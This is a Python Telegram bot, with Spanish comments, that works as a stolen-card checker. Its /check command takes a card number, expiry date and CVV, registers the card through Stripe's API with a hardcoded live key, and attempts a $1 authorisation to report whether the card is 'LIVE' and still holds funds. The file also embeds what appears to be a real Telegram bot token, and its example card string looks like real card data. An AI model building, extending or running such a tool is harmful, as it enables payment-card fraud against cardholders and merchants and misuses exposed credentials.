from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import logging
import requests
import random
import string
import os
import time
from bs4 import BeautifulSoup
import sys
from apscheduler.schedulers.asyncio import AsyncIOScheduler

# Configurar logging
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

# Token del bot de Telegram (reemplázalo con tu token real)
TOKEN = "8090451672:AAGrJrUNfHfPjrcIQiJCo5pY0Lz5fgmkEdE"

# Configurar scheduler sin pytz
scheduler = AsyncIOScheduler()

# Nueva versión del banner
HEADER_TEXT = """
████████╗ ██████╗ ██╗  ██╗██╗ ██████╗ 
╚══██╔══╝██╔═══██╗██║ ██╔╝██║██╔═══██╗
   ██║   ██║   ██║█████╔╝ ██║██║   ██║
   ██║   ██║   ██║██╔═██╗ ██║██║   ██║
   ██║   ╚██████╔╝██║  ██╗██║╚██████╔╝
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ 
BOT V3 - CUSTOMIZED
"""

async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(f"{HEADER_TEXT}\n\nCreador: @TuUsuario")

async def check_card(update: Update, context: CallbackContext) -> None:
    try:
        text = update.message.text
        if text.startswith("/check"):
            tarjeta = text.split("/check ")[-1]
            resultado = verificar_tarjeta(tarjeta)
            await update.message.reply_text(resultado)
    except Exception:
        await update.message.reply_text("⚠️ Error al procesar la tarjeta.")

def verificar_tarjeta(cc: str):
    """Realiza la verificación de la tarjeta a través de Stripe y devuelve si está 'LIVE' o 'DEAD' y si tiene saldo."""
    if "|" not in cc:
        return "⚠️ Formato incorrecto. Usa: /check 4347696942819862|07|2028|813"
    
    partes = cc.split("|")
    if len(partes) != 4:
        return "⚠️ Formato incorrecto. Asegúrate de ingresar los datos completos."
    
    card_number, exp_month, exp_year, cvv = partes
    session = requests.Session()
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0'
    }
    data = {
        'type': 'card',
        'card[number]': card_number,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'card[cvc]': cvv,
        'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
    }
    
    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    if response.status_code != 200 or 'id' not in response.json():
        return f"❌ DEAD - {cc}"
    
    payment_method_id = response.json()['id']
    
    # Intentar hacer una autorización de $1 para verificar saldo
    payment_intent_data = {
        'amount': 100,  # Monto en centavos ($1.00)
        'currency': 'usd',
        'payment_method': payment_method_id,
        'confirmation_method': 'manual',
        'confirm': 'true',
        'key': 'sk_live_tu_clave_secreta'
    }
    
    payment_response = session.post('https://api.stripe.com/v1/payment_intents', headers=headers, data=payment_intent_data)
    
    if payment_response.status_code == 200 and payment_response.json().get('status') == 'requires_capture':
        return f"✅ LIVE - Tiene saldo disponible - {cc}"
    else:
        return f"✅ LIVE - No tiene saldo - {cc}"

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_card))
    
    print("🤖 Bot en marcha... Presiona Ctrl + C para detenerlo.")
    app.run_polling()

if __name__ == "__main__":
    main()
